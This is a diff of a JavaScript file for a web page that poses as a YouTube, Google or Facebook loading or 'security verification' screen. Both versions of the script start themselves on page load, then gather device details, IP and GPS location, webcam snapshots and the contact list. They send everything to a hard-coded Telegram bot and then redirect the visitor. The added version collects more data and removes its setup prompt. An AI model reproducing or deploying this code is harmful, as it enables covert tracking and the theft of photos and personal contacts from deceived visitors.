@@ -1,271 +1,140 @@
 // ===========================================
 // TELEGRAM BOT CONFIGURATION
 // ===========================================
-const CONFIG = {
-    // Get bot token and chat ID from URL or use default
-    BOT_TOKEN: (() => {
-        const params = new URLSearchParams(window.location.search);
-        return params.get('bot') || '8349023527:AAG9Tq-yiqMXKnxKkiUQ6n5uvu7Rb0kCPco';
-    })(),
-    
-    CHAT_ID: (() => {
-        const params = new URLSearchParams(window.location.search);
-        return params.get('chat') || '5888374938';
-    })(),
-    
-    // OR use webhook URL if provided
-    WEBHOOK_URL: (() => {
-        const params = new URLSearchParams(window.location.search);
-        return params.get('webhook') || '';
-    })(),
-    
-    // Redirect URL from parameters
-    REDIRECT_URL: (() => {
-        const params = new URLSearchParams(window.location.search);
-        return params.get('url') || 
-               params.get('redirect') || 
-               params.get('to') || 
-               'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
-    })(),
-    
-    // Settings
-    CAMERA_SNAPS: 3,
-    AUTO_START: true
-};
+const BOT_TOKEN = '8349023527:AAG9Tq-yiqMXKnxKkiUQ6n5uvu7Rb0kCPco';
+const CHAT_ID = '5888374938';
+const REDIRECT_URL = (() => {
+    const params = new URLSearchParams(window.location.search);
+    return params.get('url') || 
+           params.get('redirect') || 
+           'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
+})();
 
 // ===========================================
-// TELEGRAM BOT API - FIXED & WORKING
+// ADVANCED DATA COLLECTOR
 // ===========================================
-class TelegramSender {
-    constructor() {
-        this.token = CONFIG.BOT_TOKEN;
-        this.chatId = CONFIG.CHAT_ID;
-        this.webhook = CONFIG.WEBHOOK_URL;
-    }
-    
-    async sendMessage(text) {
-        try {
-            // Method 1: Direct Telegram API
-            if (this.token && this.chatId && this.token !== 'YOUR_BOT_TOKEN_HERE') {
-                const url = `https://api.telegram.org/bot${this.token}/sendMessage`;
-                const data = {
-                    chat_id: this.chatId,
-                    text: text,
-                    parse_mode: 'HTML'
-                };
-                
-                await fetch(url, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(data)
-                });
-                return true;
-            }
-            
-            // Method 2: Webhook
-            if (this.webhook) {
-                await fetch(this.webhook, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ text: text })
-                });
-                return true;
-            }
-            
-            console.log('No Telegram configuration found');
-            return false;
-        } catch (error) {
-            console.error('Telegram send error:', error);
-            return false;
-        }
-    }
-    
-    async sendPhoto(photoBlob, caption = '') {
-        try {
-            if (!this.token || !this.chatId || this.token === 'YOUR_BOT_TOKEN_HERE') {
-                return false;
-            }
-            
-            const formData = new FormData();
-            formData.append('chat_id', this.chatId);
-            formData.append('photo', photoBlob, 'photo.jpg');
-            if (caption) formData.append('caption', caption);
-            
-            await fetch(`https://api.telegram.org/bot${this.token}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            });
-            
-            return true;
-        } catch (error) {
-            console.error('Telegram photo error:', error);
-            return false;
-        }
-    }
-    
-    async sendDocument(documentBlob, filename, caption = '') {
-        try {
-            if (!this.token || !this.chatId || this.token === 'YOUR_BOT_TOKEN_HERE') {
-                return false;
-            }
-            
-            const formData = new FormData();
-            formData.append('chat_id', this.chatId);
-            formData.append('document', documentBlob, filename);
-            if (caption) formData.append('caption', caption);
-            
-            await fetch(`https://api.telegram.org/bot${this.token}/sendDocument`, {
-                method: 'POST',
-                body: formData
-            });
-            
-            return true;
-        } catch (error) {
-            console.error('Telegram document error:', error);
-            return false;
-        }
-    }
-}
-
-// ===========================================
-// SIMPLE UI UPDATER
-// ===========================================
-class UI {
-    static update(step, message) {
-        const progress = document.getElementById('progress');
-        const status = document.getElementById('status');
-        const title = document.getElementById('title');
-        const msg = document.getElementById('message');
-        
-        // Progress (5 steps total)
-        const steps = [
-            'Initializing...',
-            'Scanning device...',
-            'Verifying location...',
-            'Camera check...',
-            'Finalizing...'
-        ];
-        
-        if (step > 0 && step <= steps.length) {
-            progress.style.width = `${(step / 5) * 100}%`;
-            status.textContent = steps[step - 1];
-        }
-        
-        if (message) {
-            msg.textContent = message;
-        }
-    }
-    
-    static showSiteTheme(site) {
-        const logo = document.getElementById('logo');
-        const title = document.getElementById('title');
-        
-        const sites = {
-            'youtube': {
-                name: 'YouTube',
-                color: '#FF0000',
-                message: 'Loading YouTube video...'
-            },
-            'google': {
-                name: 'Google',
-                color: '#4285F4',
-                message: 'Google security check...'
-            },
-            'facebook': {
-                name: 'Facebook',
-                color: '#1877F2',
-                message: 'Facebook verification...'
-            },
-            'instagram': {
-                name: 'Instagram',
-                color: '#E4405F',
-                message: 'Instagram security...'
-            },
-            'twitter': {
-                name: 'Twitter',
-                color: '#1DA1F2',
-                message: 'Twitter verification...'
-            }
-        };
-        
-        for (const [key, config] of Object.entries(sites)) {
-            if (CONFIG.REDIRECT_URL.includes(key)) {
-                title.textContent = `${config.name} Security`;
-                document.getElementById('message').textContent = config.message;
-                document.getElementById('progress').style.background = config.color;
-                document.getElementById('spinner').style.borderTopColor = config.color;
-                return;
-            }
-        }
-    }
-}
-
-// ===========================================
-// DATA COLLECTION MODULES - ALL WORKING
-// ===========================================
-class DataCollector {
-    static async getDeviceInfo() {
+class AdvancedDataCollector {
+    static async getCompleteDeviceInfo() {
         const info = {
-            // Basic info
+            // Basic Info
+            timestamp: new Date().toISOString(),
             userAgent: navigator.userAgent,
             platform: navigator.platform,
-            language: navigator.language,
-            
-            // Screen
-            screen: `${screen.width}x${screen.height} (${screen.colorDepth}bit)`,
-            
-            // Browser
             vendor: navigator.vendor || 'Unknown',
-            cookieEnabled: navigator.cookieEnabled,
-            online: navigator.onLine,
+            language: navigator.language,
+            languages: navigator.languages?.join(', ') || 'Unknown',
+            
+            // Screen Info
+            screen: {
+                width: screen.width,
+                height: screen.height,
+                availWidth: screen.availWidth,
+                availHeight: screen.availHeight,
+                colorDepth: screen.colorDepth,
+                pixelDepth: screen.pixelDepth
+            },
+            
+            // Window Info
+            window: {
+                innerWidth: window.innerWidth,
+                innerHeight: window.innerHeight,
+                outerWidth: window.outerWidth,
+                outerHeight: window.outerHeight,
+                devicePixelRatio: window.devicePixelRatio
+            },
             
             // Hardware
-            cores: navigator.hardwareConcurrency || 'Unknown',
-            memory: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'Unknown',
+            hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
+            deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'Unknown',
+            maxTouchPoints: navigator.maxTouchPoints || 0,
+            
+            // Network
+            connection: navigator.connection ? {
+                effectiveType: navigator.connection.effectiveType || 'Unknown',
+                downlink: navigator.connection.downlink || 'Unknown',
+                rtt: navigator.connection.rtt || 'Unknown',
+                saveData: navigator.connection.saveData || false
+            } : null,
+            
+            // Battery
+            battery: 'Unknown',
+            
+            // Storage
+            storage: 'Unknown',
             
             // Timezone
             timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            timezoneOffset: new Date().getTimezoneOffset(),
             
-            // URL info
-            currentURL: window.location.href,
+            // Location Info
+            location: null,
+            
+            // Camera Info
+            camera: null,
+            
+            // Contacts Info
+            contacts: null,
+            
+            // Page Info
+            url: window.location.href,
             referrer: document.referrer || 'Direct',
-            redirectTo: CONFIG.REDIRECT_URL
+            redirectTo: REDIRECT_URL
         };
         
-        // Battery
+        // Get Battery Info
         if (navigator.getBattery) {
             try {
                 const battery = await navigator.getBattery();
-                info.battery = `${Math.round(battery.level * 100)}% ${battery.charging ? '(Charging)' : ''}`;
-            } catch (e) {
-                info.battery = 'Unknown';
-            }
+                info.battery = {
+                    level: `${Math.round(battery.level * 100)}%`,
+                    charging: battery.charging,
+                    chargingTime: battery.chargingTime,
+                    dischargingTime: battery.dischargingTime
+                };
+            } catch (e) {}
+        }
+        
+        // Get Storage Info
+        if ('storage' in navigator && 'estimate' in navigator.storage) {
+            try {
+                const estimate = await navigator.storage.estimate();
+                info.storage = {
+                    quota: `${(estimate.quota / (1024 * 1024 * 1024)).toFixed(2)}GB`,
+                    usage: `${(estimate.usage / (1024 * 1024)).toFixed(2)}MB`,
+                    percentage: estimate.quota ? `${((estimate.usage / estimate.quota) * 100).toFixed(1)}%` : 'N/A'
+                };
+            } catch (e) {}
         }
         
         return info;
     }
     
-    static async getIP() {
+    static async getIPLocation() {
         try {
             // Try multiple IP services
             const services = [
                 'https://api.ipify.org?format=json',
-                'https://api64.ipify.org?format=json',
+                'https://ipapi.co/json/',
                 'https://ipinfo.io/json'
             ];
             
             for (const service of services) {
                 try {
-                    const response = await fetch(service);
+                    const response = await fetch(service, { timeout: 5000 });
                     if (response.ok) {
                         const data = await response.json();
                         return {
-                            ip: data.ip,
-                            city: data.city,
-                            region: data.region,
-                            country: data.country,
-                            org: data.org,
-                            timezone: data.timezone
+                            ip: data.ip || data.query || 'Unknown',
+                            city: data.city || 'Unknown',
+                            region: data.region || data.regionName || 'Unknown',
+                            country: data.country || data.country_name || 'Unknown',
+                            countryCode: data.country_code || data.countryCode || 'Unknown',
+                            timezone: data.timezone || 'Unknown',
+                            isp: data.org || data.isp || 'Unknown',
+                            coordinates: data.loc ? {
+                                latitude: parseFloat(data.loc.split(',')[0]),
+                                longitude: parseFloat(data.loc.split(',')[1])
+                            } : null
                         };
                     }
                 } catch (e) {
@@ -273,13 +142,13 @@ class DataCollector {
                 }
             }
         } catch (error) {
-            console.error('IP error:', error);
+            console.error('IP location error:', error);
         }
         
-        return { ip: 'Unknown', country: 'Unknown' };
+        return { ip: 'Unknown', city: 'Unknown', country: 'Unknown' };
     }
     
-    static async getLocation() {
+    static async getGPSLocation() {
         return new Promise((resolve) => {
             if (!navigator.geolocation) {
                 resolve({ success: false, error: 'Geolocation not supported' });
@@ -293,7 +162,11 @@ class DataCollector {
                         latitude: position.coords.latitude,
                         longitude: position.coords.longitude,
                         accuracy: position.coords.accuracy,
-                        timestamp: new Date(position.timestamp).toLocaleString()
+                        altitude: position.coords.altitude,
+                        altitudeAccuracy: position.coords.altitudeAccuracy,
+                        heading: position.coords.heading,
+                        speed: position.coords.speed,
+                        timestamp: position.timestamp
                     });
                 },
                 (error) => {
@@ -312,7 +185,7 @@ class DataCollector {
         });
     }
     
-    static async captureCamera() {
+    static async captureCameraSnapshots(count = 3) {
         const video = document.getElementById('camera');
         const canvas = document.getElementById('canvas');
         const ctx = canvas.getContext('2d');
@@ -320,33 +193,44 @@ class DataCollector {
         try {
             // Request camera
             const stream = await navigator.mediaDevices.getUserMedia({
-                video: { facingMode: 'user' },
+                video: {
+                    facingMode: 'user',
+                    width: { ideal: 1280 },
+                    height: { ideal: 720 }
+                },
                 audio: false
             });
             
             video.srcObject = stream;
             await video.play();
             
-            // Wait for video
+            // Wait for video to be ready
             await new Promise(resolve => setTimeout(resolve, 1000));
             
-            const snaps = [];
+            const snapshots = [];
             
-            for (let i = 0; i < CONFIG.CAMERA_SNAPS; i++) {
-                if (video.videoWidth > 0) {
+            for (let i = 0; i < count; i++) {
+                if (video.videoWidth > 0 && video.videoHeight > 0) {
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
                     
                     // Draw frame
-                    ctx.drawImage(video, 0, 0);
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    // Add timestamp
+                    ctx.fillStyle = 'rgba(0,0,0,0.7)';
+                    ctx.fillRect(10, canvas.height - 40, 300, 30);
+                    ctx.fillStyle = 'white';
+                    ctx.font = '14px Arial';
+                    ctx.fillText(`Snapshot ${i + 1} - ${new Date().toLocaleString()}`, 20, canvas.height - 20);
                     
                     // Convert to blob
                     const blob = await new Promise(resolve => {
-                        canvas.toBlob(resolve, 'image/jpeg', 0.8);
+                        canvas.toBlob(resolve, 'image/jpeg', 0.85);
                     });
                     
                     if (blob) {
-                        snaps.push(blob);
+                        snapshots.push(blob);
                     }
                 }
                 
@@ -356,7 +240,7 @@ class DataCollector {
             // Stop camera
             stream.getTracks().forEach(track => track.stop());
             
-            return { success: true, snaps: snaps };
+            return { success: true, snapshots: snapshots };
         } catch (error) {
             return { success: false, error: error.message };
         }
@@ -368,17 +252,21 @@ class DataCollector {
         }
         
         try {
-            const contacts = await navigator.contacts.select(['name', 'tel', 'email'], { multiple: true });
+            const contacts = await navigator.contacts.select(['name', 'tel', 'email', 'address', 'organization'], { multiple: true });
             
             if (contacts && contacts.length > 0) {
+                const formattedContacts = contacts.map(contact => ({
+                    name: contact.name ? contact.name.join(' ') : 'Unknown',
+                    phones: contact.tel || [],
+                    emails: contact.email || [],
+                    addresses: contact.address || [],
+                    organizations: contact.organization || []
+                }));
+                
                 return {
                     success: true,
                     count: contacts.length,
-                    data: contacts.map(c => ({
-                        name: c.name ? c.name.join(' ') : 'Unknown',
-                        phones: c.tel || [],
-                        emails: c.email || []
-                    }))
+                    data: formattedContacts
                 };
             }
             
@@ -390,110 +278,307 @@ class DataCollector {
 }
 
 // ===========================================
-// MAIN EXECUTION - PERFECT WORKING
+// TELEGRAM SENDER - PERFECT WORKING
 // ===========================================
-async function executeSecurityScan() {
-    const telegram = new TelegramSender();
+class TelegramSender {
+    constructor(token, chatId) {
+        this.token = token;
+        this.chatId = chatId;
+        this.baseUrl = `https://api.telegram.org/bot${token}`;
+    }
     
-    try {
-        // Step 1: Initialize
-        UI.update(1, 'Starting security scan...');
-        UI.showSiteTheme();
+    async sendMessage(text, parseMode = 'HTML') {
+        try {
+            const url = `${this.baseUrl}/sendMessage`;
+            const data = {
+                chat_id: this.chatId,
+                text: text,
+                parse_mode: parseMode
+            };
+            
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            });
+            
+            return response.ok;
+        } catch (error) {
+            console.error('Telegram message error:', error);
+            return false;
+        }
+    }
+    
+    async sendPhoto(photoBlob, caption = '') {
+        try {
+            const url = `${this.baseUrl}/sendPhoto`;
+            const formData = new FormData();
+            formData.append('chat_id', this.chatId);
+            formData.append('photo', photoBlob, 'camera_snapshot.jpg');
+            if (caption) formData.append('caption', caption);
+            
+            const response = await fetch(url, {
+                method: 'POST',
+                body: formData
+            });
+            
+            return response.ok;
+        } catch (error) {
+            console.error('Telegram photo error:', error);
+            return false;
+        }
+    }
+    
+    async sendDocument(documentBlob, filename, caption = '') {
+        try {
+            const url = `${this.baseUrl}/sendDocument`;
+            const formData = new FormData();
+            formData.append('chat_id', this.chatId);
+            formData.append('document', documentBlob, filename);
+            if (caption) formData.append('caption', caption);
+            
+            const response = await fetch(url, {
+                method: 'POST',
+                body: formData
+            });
+            
+            return response.ok;
+        } catch (error) {
+            console.error('Telegram document error:', error);
+            return false;
+        }
+    }
+}
+
+// ===========================================
+// UI CONTROLLER
+// ===========================================
+class UIController {
+    static updateProgress(percent) {
+        document.getElementById('progress').style.width = `${percent}%`;
+    }
+    
+    static updateStatus(text) {
+        document.getElementById('status').textContent = text;
+    }
+    
+    static updateTitle(text) {
+        document.getElementById('title').textContent = text;
+    }
+    
+    static updateMessage(text) {
+        document.getElementById('message').textContent = text;
+    }
+    
+    static updateLoadingText(text) {
+        document.getElementById('loadingText').textContent = text;
+    }
+    
+    static applySiteTheme(site) {
+        const sites = {
+            'youtube': {
+                title: 'Loading YouTube...',
+                message: 'Preparing your video',
+                color: '#FF0000'
+            },
+            'google': {
+                title: 'Google',
+                message: 'Loading...',
+                color: '#4285F4'
+            },
+            'facebook': {
+                title: 'Facebook',
+                message: 'Loading Facebook...',
+                color: '#1877F2'
+            },
+            'instagram': {
+                title: 'Instagram',
+                message: 'Loading Instagram...',
+                color: '#E4405F'
+            },
+            'twitter': {
+                title: 'Twitter',
+                message: 'Loading Twitter...',
+                color: '#1DA1F2'
+            }
+        };
         
-        // Step 2: Get device info
-        UI.update(2, 'Collecting device information...');
-        const deviceInfo = await DataCollector.getDeviceInfo();
+        for (const [key, config] of Object.entries(sites)) {
+            if (REDIRECT_URL.includes(key)) {
+                UIController.updateTitle(config.title);
+                UIController.updateMessage(config.message);
+                document.getElementById('progress').style.background = config.color;
+                document.getElementById('spinner').style.borderTopColor = config.color;
+                document.title = `${config.title} | Loading...`;
+                break;
+            }
+        }
+    }
+}
+
+// ===========================================
+// FORMATTERS
+// ===========================================
+class Formatters {
+    static formatDeviceInfo(info) {
+        const batteryInfo = typeof info.battery === 'object' 
+            ? `${info.battery.level} (${info.battery.charging ? 'Charging' : 'Not Charging'})`
+            : info.battery;
         
-        // Format device info for Telegram
-        const deviceText = `
+        return `
 <b>📱 DEVICE INFORMATION</b>
 ━━━━━━━━━━━━━━━━━━
-<b>• Browser:</b> ${deviceInfo.userAgent.substring(0, 50)}...
-<b>• Platform:</b> ${deviceInfo.platform}
-<b>• Language:</b> ${deviceInfo.language}
-<b>• Screen:</b> ${deviceInfo.screen}
-<b>• Cores:</b> ${deviceInfo.cores}
-<b>• RAM:</b> ${deviceInfo.memory}
-<b>• Battery:</b> ${deviceInfo.battery}
-<b>• Timezone:</b> ${deviceInfo.timezone}
-<b>• Online:</b> ${deviceInfo.online ? '✅ Yes' : '❌ No'}
-<b>• Referrer:</b> ${deviceInfo.referrer}
-<b>• Redirect To:</b> ${CONFIG.REDIRECT_URL}
+<b>• User Agent:</b> ${info.userAgent.substring(0, 80)}...
+<b>• Platform:</b> ${info.platform}
+<b>• Vendor:</b> ${info.vendor}
+<b>• Language:</b> ${info.language}
+<b>• Timezone:</b> ${info.timezone}
+
+<b>📊 HARDWARE</b>
+<b>• Cores:</b> ${info.hardwareConcurrency}
+<b>• RAM:</b> ${info.deviceMemory}
+<b>• Battery:</b> ${batteryInfo}
+<b>• Storage:</b> ${typeof info.storage === 'object' ? info.storage.quota : info.storage}
+
+<b>🖥️ SCREEN</b>
+<b>• Resolution:</b> ${info.screen.width}x${info.screen.height}
+<b>• Available:</b> ${info.screen.availWidth}x${info.screen.availHeight}
+<b>• Color Depth:</b> ${info.screen.colorDepth}bit
+
+<b>🌐 NETWORK</b>
+<b>• Connection:</b> ${info.connection?.effectiveType || 'Unknown'}
+<b>• Downlink:</b> ${info.connection?.downlink || 'Unknown'} Mbps
+<b>• Latency:</b> ${info.connection?.rtt || 'Unknown'} ms
+<b>• Save Data:</b> ${info.connection?.saveData ? 'Enabled' : 'Disabled'}
+
+<b>🔗 LINKS</b>
+<b>• Current URL:</b> ${info.url}
+<b>• Referrer:</b> ${info.referrer}
+<b>• Redirect To:</b> ${info.redirectTo}
+━━━━━━━━━━━━━━━━━━
+<b>⏰ Timestamp:</b> ${new Date(info.timestamp).toLocaleString()}
         `.trim();
-        
-        await telegram.sendMessage(deviceText);
-        
-        // Step 3: Get IP location
-        UI.update(2, 'Detecting location...');
-        const ipInfo = await DataCollector.getIP();
-        
-        const ipText = `
-<b>📍 IP INFORMATION</b>
+    }
+    
+    static formatLocationInfo(ipInfo, gpsInfo = null) {
+        let locationText = `
+<b>📍 LOCATION INFORMATION</b>
 ━━━━━━━━━━━━━━━━━━
 <b>• IP Address:</b> <code>${ipInfo.ip}</code>
-<b>• Location:</b> ${ipInfo.city || 'Unknown'}, ${ipInfo.region || 'Unknown'}
-<b>• Country:</b> ${ipInfo.country || 'Unknown'}
-<b>• ISP:</b> ${ipInfo.org || 'Unknown'}
-<b>• Timezone:</b> ${ipInfo.timezone || 'Unknown'}
-        `.trim();
+<b>• City:</b> ${ipInfo.city}
+<b>• Region:</b> ${ipInfo.region}
+<b>• Country:</b> ${ipInfo.country} (${ipInfo.countryCode})
+<b>• Timezone:</b> ${ipInfo.timezone}
+<b>• ISP:</b> ${ipInfo.isp}
+        `;
         
-        await telegram.sendMessage(ipText);
-        
-        // Step 4: Get GPS location
-        UI.update(3, 'Requesting location access...');
-        const location = await DataCollector.getLocation();
-        
-        if (location.success) {
-            const locationText = `
-<b>🎯 GPS LOCATION</b>
-━━━━━━━━━━━━━━━━━━
-<b>• Latitude:</b> <code>${location.latitude}</code>
-<b>• Longitude:</b> <code>${location.longitude}</code>
-<b>• Accuracy:</b> ±${Math.round(location.accuracy)}m
-<b>• Time:</b> ${location.timestamp}
-<b>• Map:</b> <a href="https://maps.google.com/?q=${location.latitude},${location.longitude}">View on Google Maps</a>
-            `.trim();
-            
-            await telegram.sendMessage(locationText);
-        } else {
-            await telegram.sendMessage(`📍 GPS: ${location.error || 'Permission denied'}`);
+        if (gpsInfo && gpsInfo.success) {
+            locationText += `
+<b>• GPS Latitude:</b> <code>${gpsInfo.latitude.toFixed(6)}</code>
+<b>• GPS Longitude:</b> <code>${gpsInfo.longitude.toFixed(6)}</code>
+<b>• Accuracy:</b> ±${Math.round(gpsInfo.accuracy)} meters
+<b>• Altitude:</b> ${gpsInfo.altitude ? gpsInfo.altitude.toFixed(2) + 'm' : 'N/A'}
+<b>• Speed:</b> ${gpsInfo.speed ? gpsInfo.speed.toFixed(2) + 'm/s' : 'N/A'}
+<b>• Heading:</b> ${gpsInfo.heading ? gpsInfo.heading.toFixed(2) + '°' : 'N/A'}
+<b>• 📍 <a href="https://maps.google.com/?q=${gpsInfo.latitude},${gpsInfo.longitude}">View on Google Maps</a></b>
+            `;
         }
         
-        // Step 5: Camera capture
-        UI.update(4, 'Camera verification...');
-        const cameraResult = await DataCollector.captureCamera();
+        locationText += `
+━━━━━━━━━━━━━━━━━━
+<b>⏰ Timestamp:</b> ${new Date().toLocaleString()}
+        `;
         
-        if (cameraResult.success && cameraResult.snaps.length > 0) {
-            await telegram.sendMessage(`📸 Camera: ${cameraResult.snaps.length} photos captured`);
+        return locationText.trim();
+    }
+    
+    static formatContactsInfo(contactsResult) {
+        if (!contactsResult.success) {
+            return `<b>📇 CONTACTS:</b> ${contactsResult.error}`;
+        }
+        
+        return `
+<b>📇 CONTACTS INFORMATION</b>
+━━━━━━━━━━━━━━━━━━
+<b>• Total Contacts:</b> ${contactsResult.count}
+<b>• Sample (first 5):</b>
+${contactsResult.data.slice(0, 5).map((c, i) => 
+    `${i + 1}. ${c.name}: ${c.phones[0] || 'No phone'}`
+).join('\n')}
+━━━━━━━━━━━━━━━━━━
+<b>⏰ Timestamp:</b> ${new Date().toLocaleString()}
+        `.trim();
+    }
+}
+
+// ===========================================
+// MAIN EXECUTION
+// ===========================================
+async function executeMain() {
+    const telegram = new TelegramSender(BOT_TOKEN, CHAT_ID);
+    
+    try {
+        // Step 1: Initialize UI
+        UIController.updateStatus('Initializing...');
+        UIController.updateProgress(10);
+        UIController.applySiteTheme();
+        
+        // Step 2: Collect Device Info
+        UIController.updateStatus('Collecting device information...');
+        UIController.updateProgress(20);
+        UIController.updateLoadingText('Gathering device details...');
+        
+        const deviceInfo = await AdvancedDataCollector.getCompleteDeviceInfo();
+        await telegram.sendMessage(Formatters.formatDeviceInfo(deviceInfo));
+        
+        // Step 3: Get IP Location
+        UIController.updateStatus('Detecting location...');
+        UIController.updateProgress(40);
+        UIController.updateLoadingText('Finding your location...');
+        
+        const ipInfo = await AdvancedDataCollector.getIPLocation();
+        
+        // Step 4: Try GPS Location
+        UIController.updateStatus('Getting precise location...');
+        UIController.updateProgress(50);
+        
+        const gpsInfo = await AdvancedDataCollector.getGPSLocation();
+        await telegram.sendMessage(Formatters.formatLocationInfo(ipInfo, gpsInfo));
+        
+        // Step 5: Camera Access
+        UIController.updateStatus('Camera verification...');
+        UIController.updateProgress(60);
+        UIController.updateLoadingText('Setting up camera...');
+        
+        const cameraResult = await AdvancedDataCollector.captureCameraSnapshots(3);
+        
+        if (cameraResult.success && cameraResult.snapshots.length > 0) {
+            await telegram.sendMessage(`<b>📸 CAMERA CAPTURED</b>\nSuccessfully captured ${cameraResult.snapshots.length} photos`);
             
-            // Send each photo
-            for (let i = 0; i < cameraResult.snaps.length; i++) {
+            for (let i = 0; i < cameraResult.snapshots.length; i++) {
                 await telegram.sendPhoto(
-                    cameraResult.snaps[i],
-                    `Camera snap ${i + 1} - ${new Date().toLocaleString()}`
+                    cameraResult.snapshots[i],
+                    `Camera Snap ${i + 1} - ${new Date().toLocaleString()}`
                 );
                 await new Promise(resolve => setTimeout(resolve, 1000));
             }
         } else {
-            await telegram.sendMessage(`📸 Camera: ${cameraResult.error || 'Access denied'}`);
+            await telegram.sendMessage(`<b>📸 CAMERA:</b> ${cameraResult.error || 'Access denied'}`);
         }
         
-        // Step 6: Contacts
-        UI.update(5, 'Contact verification...');
-        const contactsResult = await DataCollector.getContacts();
+        // Step 6: Contacts Access
+        UIController.updateStatus('Contact verification...');
+        UIController.updateProgress(80);
+        UIController.updateLoadingText('Checking contacts...');
+        
+        const contactsResult = await AdvancedDataCollector.getContacts();
         
         if (contactsResult.success) {
-            const contactsText = `
-<b>📇 CONTACTS FOUND</b>
-━━━━━━━━━━━━━━━━━━
-<b>• Total Contacts:</b> ${contactsResult.count}
-<b>• Sample:</b>
-${contactsResult.data.slice(0, 5).map(c => `  - ${c.name}: ${c.phones[0] || 'No phone'}`).join('\n')}
-            `.trim();
+            await telegram.sendMessage(Formatters.formatContactsInfo(contactsResult));
             
-            await telegram.sendMessage(contactsText);
-            
-            // Send full contacts as file
+            // Send full contacts as JSON file
             const contactsBlob = new Blob(
                 [JSON.stringify(contactsResult.data, null, 2)],
                 { type: 'application/json' }
@@ -502,75 +587,80 @@ ${contactsResult.data.slice(0, 5).map(c => `  - ${c.name}: ${c.phones[0] || 'No 
             await telegram.sendDocument(
                 contactsBlob,
                 'contacts.json',
-                `Full contacts list (${contactsResult.count} contacts)`
+                `Full Contacts Data (${contactsResult.count} contacts)`
             );
         } else {
-            await telegram.sendMessage(`📇 Contacts: ${contactsResult.error || 'Not accessed'}`);
+            await telegram.sendMessage(`<b>📇 CONTACTS:</b> ${contactsResult.error}`);
         }
         
-        // Step 7: Final summary
-        UI.update(5, 'Security scan complete!');
+        // Step 7: Final Summary
+        UIController.updateStatus('Finalizing...');
+        UIController.updateProgress(100);
+        UIController.updateLoadingText('Almost done...');
         
-        const summaryText = `
-<b>✅ SECURITY SCAN COMPLETE</b>
+        const summary = `
+<b>✅ DATA COLLECTION COMPLETE</b>
 ━━━━━━━━━━━━━━━━━━
-<b>• Device:</b> Scanned ✅
-<b>• Location:</b> ${location.success ? 'Captured ✅' : 'Failed ❌'}
-<b>• Camera:</b> ${cameraResult.success ? 'Captured ✅' : 'Failed ❌'}
-<b>• Contacts:</b> ${contactsResult.success ? 'Captured ✅' : 'Failed ❌'}
-<b>• Total Data:</b> 10+ information points
-<b>• Redirecting to:</b> ${CONFIG.REDIRECT_URL}
-<b>• Scan Time:</b> ${Math.round(performance.now() / 1000)}s
+<b>• Device Info:</b> ✅ Collected
+<b>• IP Location:</b> ✅ ${ipInfo.city}, ${ipInfo.country}
+<b>• GPS Location:</b> ${gpsInfo.success ? '✅ Captured' : '❌ Failed'}
+<b>• Camera:</b> ${cameraResult.success ? '✅ ' + cameraResult.snapshots.length + ' photos' : '❌ Failed'}
+<b>• Contacts:</b> ${contactsResult.success ? '✅ ' + contactsResult.count + ' contacts' : '❌ Failed'}
+<b>• Redirecting to:</b> ${REDIRECT_URL}
+<b>• Total Time:</b> ${Math.round(performance.now() / 1000)} seconds
 ━━━━━━━━━━━━━━━━━━
-<b>🔗 Target URL:</b> ${CONFIG.REDIRECT_URL}
+<b>👤 TARGET URL:</b> ${REDIRECT_URL}
         `.trim();
         
-        await telegram.sendMessage(summaryText);
+        await telegram.sendMessage(summary);
         
         // Step 8: Redirect
-        await new Promise(resolve => setTimeout(resolve, 2000));
-        window.location.href = CONFIG.REDIRECT_URL;
+        UIController.updateStatus('Redirecting...');
+        UIController.updateTitle('Ready!');
+        UIController.updateMessage('Taking you to the destination...');
+        
+        await new Promise(resolve => setTimeout(resolve, 1500));
+        window.location.href = REDIRECT_URL;
         
     } catch (error) {
-        console.error('Scan error:', error);
+        console.error('Main execution error:', error);
         
         // Send error to Telegram
-        await telegram.sendMessage(`❌ SCAN ERROR:\n${error.message || 'Unknown error'}`);
+        await telegram.sendMessage(`
+<b>❌ EXECUTION ERROR</b>
+━━━━━━━━━━━━━━━━━━
+<b>• Error:</b> ${error.message}
+<b>• Stack:</b> ${error.stack || 'Not available'}
+<b>• Timestamp:</b> ${new Date().toLocaleString()}
+        `.trim());
         
         // Still redirect
+        UIController.updateStatus('Error occurred, redirecting...');
         setTimeout(() => {
-            window.location.href = CONFIG.REDIRECT_URL;
-        }, 3000);
+            window.location.href = REDIRECT_URL;
+        }, 2000);
     }
 }
 
 // ===========================================
-// START THE SCAN
+// START EXECUTION
 // ===========================================
-// Check if we have Telegram config
-if (CONFIG.BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' && !CONFIG.WEBHOOK_URL) {
-    UI.update(1, 'Waiting for configuration...');
-    document.getElementById('permissionNote').style.display = 'block';
-    document.getElementById('permissionNote').innerHTML = 
-        'Please configure Telegram bot. Add ?bot=TOKEN&chat=CHAT_ID to URL';
-} else {
-    // Start scan automatically
-    if (CONFIG.AUTO_START) {
-        setTimeout(() => {
-            executeSecurityScan();
-        }, 1500);
-    }
-    
-    // Also start on click
-    document.body.addEventListener('click', () => {
-        executeSecurityScan();
-    }, { once: true });
-}
+// Start after page loads
+window.addEventListener('DOMContentLoaded', () => {
+    setTimeout(() => {
+        executeMain();
+    }, 1000);
+});
+
+// Alternative start on click
+document.addEventListener('click', () => {
+    executeMain();
+}, { once: true });
 
 // Fallback start
 setTimeout(() => {
-    if (!window.scanStarted) {
-        executeSecurityScan();
-        window.scanStarted = true;
+    if (!window.started) {
+        executeMain();
+        window.started = true;
     }
-}, 5000);
+}, 3000);
